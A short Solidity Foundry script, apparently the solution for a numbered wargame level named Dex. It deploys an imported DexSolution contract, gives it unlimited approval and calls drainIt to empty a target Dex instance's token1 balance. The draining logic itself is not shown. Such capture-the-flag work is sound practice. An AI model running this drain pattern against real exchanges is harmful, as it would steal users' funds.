// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import { IDex } from "src/22_Dex/IDex.sol";
import { DexSolution } from "src/22_Dex/DexSolution.sol";

contract DexScript is Script {

    IDex dex;
    address instanceAddress = 0xAf5a6f5E2c7E8c5c9d2398C1b4b8E91027385c5b;
    address token1;
    address token2;


    function setUp() public {
        dex = IDex(instanceAddress);
        token1 = dex.token1();
        token2 = dex.token2();
    }

    function run() public {
        vm.startBroadcast();
        DexSolution dexSolution = new DexSolution();
        dex.approve(address(dexSolution), type(uint256).max);
        dexSolution.drainIt(dex);
        assert(dex.balanceOf(token1, address(dex)) == 0);
        vm.stopBroadcast();
    }
}
